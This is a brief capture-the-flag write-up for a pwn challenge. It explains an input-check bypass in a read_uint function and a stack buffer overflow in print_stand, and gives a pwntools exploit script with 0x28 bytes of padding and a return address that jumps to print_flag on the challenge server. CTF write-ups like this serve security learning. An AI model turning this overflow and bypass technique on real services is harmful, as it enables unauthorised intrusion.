# the-usual

```
points: 447
text: In the heart of a bustling medieval market, a burly Viking with a formidable beard and weathered armor stumbles upon a peculiar sight—a vibrant flag shop adorned with banners of every hue. Intrigued by the fluttering colors, he enters the shop, his towering frame contrasting with the delicate textiles. With a mix of curiosity and confusion, he marvels at the array of flags, pondering which one might best represent his warrior clan amidst the sea of symbols and sigils.

nc 35.94.129.106 3008

```
we can see that the only spot where we can do an overflow is in the function **print_stand**, to execute it we need to buy the 3rd element

we dont have enough money tho!

to buy it we need to look at the **read_uint** function

###### i aint readin allat ######

for some magical reason ```stroul("0anystring",0LL,10)``` returns 0 but passes all the checks

now inside the **print_stand** function we can do a ret to win to **print_flag**

```py
from pwn import *

r = remote("35.94.129.106", 3008)

r.sendline(b"3")
r.sendline(b"0 M0NT3C4RL0 F7W")
ret = p64(0x0000000000401557)
r.send(b"a"*0x28+ret)
r.interactive()
```